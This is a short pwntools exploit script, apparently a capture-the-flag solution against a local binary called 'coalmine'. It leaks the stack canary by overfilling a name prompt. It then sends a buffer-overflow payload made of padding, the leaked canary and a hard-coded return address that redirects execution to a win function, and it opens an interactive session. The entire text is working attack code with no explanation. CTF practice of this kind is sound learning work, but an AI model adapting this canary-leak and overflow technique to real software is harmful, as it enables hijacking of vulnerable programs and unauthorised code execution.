#!/bin/python3
from pwn import *

canaryOffset = 0x30 - 0x10
winOffset = 0x60 - 0x54


def getCanary():

	p = process('./coalmine')

	context.log_level = 'debug'

	p.recvuntil('> ')

	p.send(f'{canaryOffset}\n')

	p.recvuntil('name? \n')
	p.send("A"*canaryOffset)

	p.recvuntil(f'name is {"A"*canaryOffset}')

	canary = p.recv().rstrip()
	
	return canary

def bof2win(canary):
	elf = ELF('./coalmine')

	payload = b"A"*canaryOffset
	payload += canary
	payload += b"B"*winOffset
	payload += b"\xa6\x86\x04\x08"
	#payload += p32(elf.sym['tweet_tweet'])


	p = process('./coalmine')

	context.log_level = 'debug'

	p.recvuntil('> ')
	p.sendline("200")
	p.recvuntil('> ')
	p.sendline(payload)
	p.interactive()



canary = getCanary()
bof2win(canary)
